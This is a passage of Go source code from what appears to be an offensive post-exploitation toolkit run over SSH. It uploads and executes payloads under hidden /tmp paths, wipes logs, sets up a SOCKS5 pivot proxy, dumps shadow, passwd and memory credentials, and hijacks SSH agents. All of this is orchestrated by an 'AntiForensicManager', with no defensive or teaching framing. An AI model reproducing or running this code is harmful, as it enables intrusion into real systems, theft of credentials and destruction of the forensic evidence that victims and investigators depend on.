		if err := os.WriteFile(filename, data, 0600); err != nil {
			continue
		}
	}

	fmt.Printf("[CredDump] Saved %d credentials to %s\n", len(creds), cd.OutputDir)
	return nil
}

type FileExecutor struct {
	Type      string
	Arguments []string
	Timeout   time.Duration
	Detect    bool
}

type ExecutionResult struct {
	Success  bool
	Output   string
	Error    string
	ExitCode int
	Duration time.Duration
	Method   string
}

func NewFileExecutor() *FileExecutor {
	return &FileExecutor{
		Detect:  true,
		Timeout: 60 * time.Second,
	}
}

func (fe *FileExecutor) DetectFileType(content []byte) string {
	if len(content) == 0 {
		return "unknown"
	}

	if strings.HasPrefix(string(content), "#!/") {
		if strings.Contains(string(content), "python") {
			return "python"
		}
		if strings.Contains(string(content), "bash") || strings.Contains(string(content), "sh") {
			return "bash"
		}
		return "script"
	}

	if len(content) >= 4 && string(content[:4]) == "\x7fELF" {
		return "binary"
	}

	if len(content) >= 2 && string(content[:2]) == "MZ" {
		return "windows"
	}

	if strings.Contains(string(content), "PYTHON") {
		return "python"
	}

	if strings.Contains(string(content), "powershell") || strings.Contains(string(content), "PS ") {
		return "powershell"
	}

	return "unknown"
}

func (fe *FileExecutor) ExecuteOnHost(conn *ssh.Client, filePath string, args []string) (*ExecutionResult, error) {
	if conn == nil {
		return nil, fmt.Errorf("ssh connection is nil")
	}

	fmt.Printf("[Executor] Executing %s on target\n", filePath)

	result := &ExecutionResult{
		Duration: 0,
		Method:   "ssh",
	}

	start := time.Now()

	if !strings.HasPrefix(filePath, "/") && !strings.HasPrefix(filePath, ".") {
		uploadedPath := fe.uploadFile(conn, filePath)
		if uploadedPath == "" {
			result.Error = "failed to upload file"
			return result, fmt.Errorf(result.Error)
		}
		filePath = uploadedPath
	}

	var fileType string
	if fe.Detect {
		content, err := os.ReadFile(filePath)
		if err != nil {
			fileType = "unknown"
		} else {
			fileType = fe.DetectFileType(content)
		}
	} else {
		fileType = fe.Type
	}

	var cmd string
	switch fileType {
	case "python":
		cmd = fmt.Sprintf("python3 %s %s 2>&1", quoteShell(filePath), strings.Join(args, " "))
	case "bash":
		cmd = fmt.Sprintf("bash %s %s 2>&1", quoteShell(filePath), strings.Join(args, " "))
	case "binary":
		cmd = fmt.Sprintf("chmod +x %s && %s %s 2>&1", quoteShell(filePath), quoteShell(filePath), strings.Join(args, " "))
	case "windows":
		cmd = fmt.Sprintf("wine %s %s 2>&1", quoteShell(filePath), strings.Join(args, " "))
	default:
		cmd = fmt.Sprintf("chmod +x %s && %s %s 2>&1", quoteShell(filePath), quoteShell(filePath), strings.Join(args, " "))
	}

	ctx, cancel := context.WithTimeout(context.Background(), fe.Timeout)
	defer cancel()

	session, err := conn.NewSession()
	if err != nil {
		result.Error = err.Error()
		return result, err
	}
	defer session.Close()

	var stdoutBuf, stderrBuf bytes.Buffer
	session.Stdout = &stdoutBuf
	session.Stderr = &stderrBuf

	done := make(chan error, 1)
	go func() {
		done <- session.Run(cmd)
	}()

	var runErr error
	select {
	case runErr = <-done:
		result.Duration = time.Since(start)
	case <-ctx.Done():
		result.Duration = time.Since(start)
		result.Success = false
		result.Error = fmt.Sprintf("command execution timeout after %v", fe.Timeout)
		result.ExitCode = -1
		fmt.Printf("[Executor] Timeout after %v\n", fe.Timeout)
		return result, fmt.Errorf("timeout after %v", fe.Timeout)
	}

	if runErr != nil {
		result.Success = false
		result.Error = stderrBuf.String()
		if result.Error == "" {
			result.Error = runErr.Error()
		}

		if exitErr, ok := runErr.(*exec.ExitError); ok {
			if exitStatus, ok := exitErr.Sys().(interface{ ExitCode() int }); ok {
				result.ExitCode = exitStatus.ExitCode()
			}
		}
	} else {
		result.Success = true
		result.Output = stdoutBuf.String()
		result.ExitCode = 0
	}

	fmt.Printf("[Executor] Execution completed in %v (exit code: %d, success: %v)\n", 
		result.Duration, result.ExitCode, result.Success)

	if result.Output != "" {
		if len(result.Output) > 500 {
			fmt.Printf("[Executor] Output (truncated): %s...\n", result.Output[:500])
		} else {
			fmt.Printf("[Executor] Output: %s\n", result.Output)
		}
	}

	if result.Error != "" && !result.Success {
		if len(result.Error) > 500 {
			fmt.Printf("[Executor] Error (truncated): %s...\n", result.Error[:500])
		} else {
			fmt.Printf("[Executor] Error: %s\n", result.Error)
		}
	}

	return result, nil
}

func (fe *FileExecutor) uploadFile(conn *ssh.Client, localPath string) string {
	content, err := os.ReadFile(localPath)
	if err != nil {
		return ""
	}

	remotePath := fmt.Sprintf("/tmp/.cache_%d", time.Now().UnixNano())

	session, err := conn.NewSession()
	if err != nil {
		return ""
	}
	defer session.Close()

	stdin, err := session.StdinPipe()
	if err != nil {
		return ""
	}

	go func() {
		defer stdin.Close()
		stdin.Write(content)
	}()

	if err := session.Run(fmt.Sprintf("cat > %s && chmod +x %s", quoteShell(remotePath), quoteShell(remotePath))); err != nil {
		return ""
	}

	return remotePath
}

func (fe *FileExecutor) ExecuteCommand(conn *ssh.Client, command string) (*ExecutionResult, error) {
	if conn == nil {
		return nil, fmt.Errorf("ssh connection is nil")
	}

	result := &ExecutionResult{
		Duration: 0,
		Method:   "command",
	}

	start := time.Now()

	ctx, cancel := context.WithTimeout(context.Background(), fe.Timeout)
	defer cancel()

	session, err := conn.NewSession()
	if err != nil {
		result.Error = err.Error()
		result.Duration = time.Since(start)
		return result, err
	}
	defer session.Close()

	var stdoutBuf, stderrBuf bytes.Buffer
	session.Stdout = &stdoutBuf
	session.Stderr = &stderrBuf

	done := make(chan error, 1)
	go func() {
		done <- session.Run(command)
	}()

	var runErr error
	select {
	case runErr = <-done:

		result.Duration = time.Since(start)
	case <-ctx.Done():

		result.Duration = time.Since(start)
		result.Success = false
		result.Error = fmt.Sprintf("command execution timeout after %v", fe.Timeout)
		result.ExitCode = -1
		fmt.Printf("[Executor] Timeout after %v\n", fe.Timeout)
		return result, fmt.Errorf("timeout after %v", fe.Timeout)
	}

	if runErr != nil {
		result.Success = false
		result.Error = stderrBuf.String()
		if result.Error == "" {
			result.Error = runErr.Error()
		}
	} else {
		result.Success = true
		result.Output = stdoutBuf.String()
	}

	fmt.Printf("[Executor] Command execution completed in %v (success: %v)\n", 
		result.Duration, result.Success)
	if result.Output != "" && fe.Timeout > 0 {
		if len(result.Output) > 500 {
			fmt.Printf("[Executor] Output (truncated): %s...\n", result.Output[:500])
		} else {
			fmt.Printf("[Executor] Output: %s\n", result.Output)
		}
	}

	if result.Error != "" && !result.Success {
		if len(result.Error) > 500 {
			fmt.Printf("[Executor] Error (truncated): %s...\n", result.Error[:500])
		} else {
			fmt.Printf("[Executor] Error: %s\n", result.Error)
		}
	}

	return result, nil
}

type AntiForensicManager struct {
	LogWiper        *LogWiper
	TunnelManager   *TunnelManager
	Obfuscator      *TrafficObfuscator
	AntiForensic    *AntiForensic
	PasswordSprayer *PasswordSprayer
	GoldenTicket    *GoldenTicket
	AgentHijacker   *AgentHijacker
	CredDumper      *CredentialDumper
	Executor        *FileExecutor
	mu              sync.Mutex
}

func NewAntiForensicManager() *AntiForensicManager {
	return &AntiForensicManager{
		LogWiper:      NewLogWiper(),
		TunnelManager: NewTunnelManager(),
		AntiForensic:  NewAntiForensic(),
		CredDumper:    NewCredentialDumper(),
		Executor:      NewFileExecutor(),
		AgentHijacker: NewAgentHijacker(),
	}
}

func (afm *AntiForensicManager) RunAll(conn *ssh.Client) error {
	afm.mu.Lock()
	defer afm.mu.Unlock()

	if conn == nil {
		return fmt.Errorf("ssh connection is nil")
	}

	fmt.Printf("\n[+] Starting Anti-Forensic Operations\n")
	fmt.Printf("[+] Target: %s\n", conn.RemoteAddr())

	if err := afm.LogWiper.WipeLogs(conn); err != nil {
		fmt.Printf("[!] Log wiping failed: %v\n", err)
	}

	if err := afm.TunnelManager.CreateSOCKS5Proxy(conn, "127.0.0.1", 1080); err != nil {
		fmt.Printf("[!] SOCKS5 proxy creation failed: %v\n", err)
	} else {
		fmt.Printf("[+] SOCKS5 proxy running on 127.0.0.1:1080\n")
	}

	if creds, err := afm.CredDumper.DumpShadow(conn); err != nil {
		fmt.Printf("[!] Shadow dump failed: %v\n", err)
	} else if len(creds) > 0 {
		fmt.Printf("[+] Dumped %d shadow entries\n", len(creds))
	}

	if creds, err := afm.CredDumper.DumpPasswd(conn); err != nil {
		fmt.Printf("[!] Passwd dump failed: %v\n", err)
	} else if len(creds) > 0 {
		fmt.Printf("[+] Dumped %d passwd entries\n", len(creds))
	}

	if err := afm.CredDumper.DumpMemory(conn); err != nil {
		fmt.Printf("[!] Memory dump failed: %v\n", err)
	}

	if err := afm.AgentHijacker.HijackAgent(conn); err != nil {
		fmt.Printf("[!] Agent hijacking failed: %v\n", err)
	}

	afm.AntiForensic.WipeMemory()

	fmt.Printf("\n[+] Anti-Forensic Operations Complete\n")
	return nil
}

func (afm *AntiForensicManager) Close() {
	afm.mu.Lock()
	defer afm.mu.Unlock()

	if afm.TunnelManager != nil {
		afm.TunnelManager.Close()
	}
}

func quoteShell(s string) string {
	return fmt.Sprintf("'%s'", strings.ReplaceAll(s, "'", "'\\''"))
}
